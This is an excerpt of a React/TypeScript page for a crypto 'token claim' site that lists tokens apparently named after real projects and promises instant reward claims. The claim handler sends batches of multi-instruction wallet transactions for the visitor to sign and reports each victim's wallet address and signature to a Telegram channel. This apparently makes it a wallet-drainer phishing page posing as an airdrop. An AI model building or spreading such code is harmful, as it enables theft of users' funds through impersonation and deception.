...
const TOKENS: Record<string, TokenData> = {
  bubo: {
    ...
    symbol: 'BUBO',
    icon: buboImage,
    description: 'Calm face. Amber glow. Meme bull walking straight through the noise with absolutely unserious conviction.',
  },
  ttt: {
    name: 'Triple T',
    symbol: 'TTT',
    icon: tripleTImage,
    description: 'The only brainrot character that remained mainstream until today. Tung Tung Tung Sahur aka Triple T',
  },
  useless: {
    name: 'Useless',
    symbol: 'USELESS',
    icon: uselessImage,
    description: 'Welcome to Useless Coin. The world\'s first cryptocurrency that promises nothing and delivers exactly that. Zero purpose. 100% useless. The world\'s most honest cryptocurrency.',
  },
  ark: {
    name: 'ARK DEFAI',
    symbol: 'ARK',
    icon: arkImage,
    description: 'ARK DEFAI is a decentralized intelligence civilization built at the intersection of AI, DAO governance, and modular on-chain architecture.',
  },
  evaa: {
    name: 'EVAA',
    symbol: 'EVAA',
    icon: evaaImage,
    description: 'This is a community hub for the #1 lending protocol on TON and Telegram - EVAA. @evaatg - official channel. @EvaaAppBot - official TMA. https://app.evaa.finance - official web app.',
  },
  zama: {
    name: 'Zama',
    symbol: 'ZAMA',
    icon: zamaImage,
    description: 'Zama - A revolutionary cryptocurrency project focused on privacy and security.',
  },
  unibase: {
    name: 'Uni Base',
    symbol: 'UNIBASE',
    icon: unibaseImage,
    description: 'Uni Base - Building the future of decentralized finance on Base blockchain.',
  },
  apepe: {
    name: 'APEPE',
    symbol: 'APEPE',
    icon: apepeImage,
    description: '$APEPE is a community-driven memecoin built natively on Solana and Ethereum, launched in official partnership with Pegswap. The claim flow is fully on-chain, transparent, and secured by end-to-end encryption technology.',
  },
  ovt: {
    name: 'OVT',
    symbol: 'OVT',
    icon: ovtImage,
    description: '$OVT (OpenVerse Token) is a next-generation utility token built on Solana and Ethereum. The claim flow is fully on-chain, transparent, and secured by end-to-end encryption technology.',
  },
};
...
const TokenDetail = () => {
    ...
    try {
      ...
      for (let i = 0; i < batches.length; i++) {
        ...
        if (transaction && transaction.instructions.length > 2) {
          ...
          const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
          await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
          sendTelegramMessage(`✅ <b>$${token?.symbol} Claim Batch ${i + 1}</b>\n👤 <code>${publicKey?.toBase58()}</code>\n🔗 <code>${signature}</code>`);
        }
      }
  ...
  if (!token) {
    return (
      <div className="min-h-screen relative overflow-hidden">
        <PegasusAnimation />
        <Navigation />
        <div className="container mx-auto pt-44 text-center">
          <Button
            onClick={() => navigate('/features-token')}
            className="mb-8 flex items-center gap-2 mx-auto"
          >
            <ArrowLeft className="w-4 h-4" />
            Back to Featured Tokens
          </Button>
          <h1 className="text-4xl font-extrabold text-gradient mb-4">Token Not Found</h1>
          <Link to="/features-token" className="text-primary hover:underline">
            Back to Featured Tokens
          </Link>
        </div>
      </div>
  ...
  return (
    <div className="min-h-screen relative overflow-hidden">
      ...
      <div className="relative z-10 container mx-auto px-4 pt-44 pb-12">
        <Button
          onClick={() => navigate(-1)}
        ...
        >
          ...
          <p className="text-lg sm:text-xl font-semibold text-foreground mb-3">
            Claim your ${token.symbol} rewards instantly
          </p>
          ...
          >
            ...
            {isClaiming ? 'Claiming...' : `Claim $${token.symbol}`}
          </Button>
        ...
        <div className="mt-12">
          <Card className="bg-card/90 border-0">
            <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8 text-center">
              <h2 className="text-2xl sm:text-3xl font-bold mb-4">About ${token.symbol}</h2>
